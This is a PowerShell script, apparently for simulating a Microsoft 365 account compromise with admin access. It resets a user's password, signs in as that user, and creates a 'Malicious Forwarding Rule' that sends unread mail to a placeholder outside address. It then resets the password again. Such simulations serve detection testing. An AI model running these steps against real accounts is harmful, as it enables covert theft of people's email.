####################################################################################################################################
##                                                                                                                                ##
##  Authenticates with Microsoft Graph as an admin.                                                                               ##
##  Changes the password of a specified user (optional if you already have the user's password).                                  ##
##  Authenticates as the compromised user using the new password.                                                                 ##
##  Creates a malicious mailbox rule to forward emails.                                                                           ##
##  Disconnects from Microsoft Graph.                                                                                             ##
##  Authenticates as an admin again and resets the compromised user's password, forcing a password change on their next sign-in.  ##
##                                                                                                                                ##
####################################################################################################################################

# Authenticate with Microsoft Graph
Connect-MgGraph

# Define the user you want to simulate the password compromise for
$userId = "user@example.com" # Replace this with the user's email address

# Change the user's password (optional if you already have the user's password)
$compromisedPassword = "CompromisedPassword123!"
Set-MgUserPassword -UserId $userId -NewPassword $compromisedPassword -ForceChangePasswordNextSignIn $false
Write-Host "User password changed: $userId"

# Authenticate as the compromised user
$credentials = New-Object System.Management.Automation.PSCredential ($userId, (ConvertTo-SecureString $compromisedPassword -AsPlainText -Force))
Connect-MgGraph -Credential $credentials

# Create a malicious mailbox rule to forward emails
$mailboxRuleName = "Malicious Forwarding Rule"
$forwardingAddress = "malicious@example.com" # Replace this with the desired forwarding address

$mailboxRule = @{
    displayName = $mailboxRuleName
    sequence    = 1
    isEnabled   = $true
    conditions  = @{
        isRead = $false
    }
    actions     = @{
        forwardAsAttachmentTo = @(@{
            emailAddress = @{
                address = $forwardingAddress
            }
        })
    }
} | ConvertTo-Json

New-MgUserMailFolderRule -UserId $userId -MailFolderId 'inbox' -BodyParameter $mailboxRule
Write-Host "Mailbox rule created for forwarding emails to: $forwardingAddress"

# Disconnect from Microsoft Graph
Disconnect-MgGraph

# Authenticate as an admin again and reset the user's password
Connect-MgGraph
$newPassword = "NewSecurePassword123!"
Set-MgUserPassword -UserId $userId -NewPassword $newPassword -ForceChangePasswordNextSignIn $true
Write-Host "User password reset: $userId"
